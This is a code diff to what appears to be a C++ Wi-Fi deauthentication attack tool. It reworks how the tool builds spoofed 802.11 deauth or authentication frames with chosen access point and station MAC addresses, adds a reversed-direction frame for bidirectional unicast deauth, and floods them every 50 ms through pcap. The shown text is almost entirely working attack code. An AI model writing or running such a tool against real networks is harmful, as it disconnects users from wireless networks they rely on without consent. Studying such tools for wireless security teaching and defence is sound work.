@@ -31,14 +31,14 @@ void usage() {
 int main(int argc, char* argv[]) {
 	Mac ap;
 	Mac station;
-	bool auth = false;
-
+	short mode = 0;
 	switch (argc){
 		case 5:
 			if(string(argv[4]).compare("-auth") == 0)
-				auth = true;
+				mode++;
 		case 4:
 			station = Mac(argv[3]);
+			mode++;
 		case 3:
 			ap = Mac(argv[2]);
 			break;
@@ -69,7 +69,7 @@ int main(int argc, char* argv[]) {
 	frame.duration = 0x013a;
 	frame.bssId = ap;
 	frame.Fraq_Squ_Number = 0x2960;
-	if(auth){
+	if(mode == 2){
 		frame.frameCtl = 0x00b0;
 		frame.dstAddr = ap;
 		frame.srcArrr = station;
@@ -81,39 +81,44 @@ int main(int argc, char* argv[]) {
 	}
 	
 	//Radiotap Header
-	memcpy((char*)&packet, (char*)&radiotap, 8);
+	memcpy(&packet, &radiotap, 8);
+
 	//Authentication or Deauthentication
-	memcpy((char*)&packet + 8, (char*)&frame, 24);
+	memcpy(&packet[8], &frame, 24);
+
 	//Wireless Management
-	short length = (auth) ? 6 : 2;
-	memcpy((char*)&packet + 32, (auth) ? (char*)&auth_param : (char*)&reason_code, length);
+	short length = 2;
+	if(mode == 2){
+		length = 6;
+		memcpy(&packet[32], &auth_param, length);
+	}
+	else{
+		memcpy(&packet[32], &reason_code, length);
+	}
 	length += 32;
 
 	//양방향 Deauth Unicast
-	bool swiching = (!station.isNull() && !auth);
-	if(swiching){
-		memcpy((char*)&packet2, (char*)&packet, length);
-		//MAC Swap
-		unsigned char tmp[6];
-		memcpy((char*)&tmp, (char*)&packet + 12, 6);
-		memcpy((char*)&packet + 12, (char*)&packet + 18, 6);
-		memcpy((char*)&packet + 18, (char*)&tmp, 6);
-	}
+	//packet2 = packet의 역방향
+	memcpy(&packet2, &packet, length);
+	//MAC Swap
+	memcpy(&packet2[12], &packet[18], 6);
+	memcpy(&packet2[18], &packet[12], 6);
 
-	cout << "BSSID : " << string(ap) << ", STATION : " << (station.isNull() ? "None" : string(station)) << ", Mode : " << ((auth) ? "Auth" : ((station.isNull()) ? "DeAuth - Broadcast" : "DeAuth - Unicast")) << endl;
+	cout << "BSSID : " << string(ap) << ", STATION : " << (station.isNull() ? "None" : string(station)) << ", Mode : " << ((mode == 2) ? "Auth" : ((station.isNull()) ? "DeAuth - Broadcast" : "DeAuth - Unicast")) << endl;
 
 	unsigned int loop = 0;
+	int res = 0;
 	while(true){
 		usleep(50000);//50ms
 		printf("Loop Count : %d\r", loop++);
 		fflush(stdout);
-		int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), length);
-		if(swiching)
-			pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet2), length);
+		if(mode & 1){
+			res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet2), length);
+		}
+		res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), length);
 		if (res != 0) {
 			fprintf(stderr, "Beacon_Flood::pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
 		}
 	}
-
 	pcap_close(pcap);
 }
